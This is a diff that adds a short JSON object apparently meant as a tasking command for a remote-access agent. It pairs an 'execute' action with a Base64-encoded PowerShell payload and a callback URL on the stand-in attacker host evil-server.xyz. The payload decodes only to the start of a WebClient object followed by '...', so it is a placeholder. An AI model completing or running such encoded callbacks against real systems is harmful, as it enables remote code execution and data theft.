@@ -1,0 +1,7 @@
+{
+  "action": "execute",
+  "payloadType": "powershell_encoded",
+  "payload": "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAIgAuAC4ALgA=",
+  "targetURL": "http://evil-server.xyz/callback?id=123",
+  "encryptionKey": "AES256"
+}
